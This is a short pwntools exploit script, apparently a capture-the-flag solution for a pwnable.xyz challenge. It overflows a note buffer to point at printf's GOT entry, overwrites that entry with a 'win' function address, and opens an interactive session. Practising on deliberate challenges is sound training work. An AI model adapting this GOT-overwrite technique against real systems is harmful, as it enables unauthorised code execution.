from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30016)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40093c
printf_got = 0x601238

sla('> ', '1')
sla('Note len? ', str(0x28))
sa('note: ', b'a' * 0x20 + p64(printf_got))

sla('> ', '2')
sa('desc: ', p64(win))

r.interactive()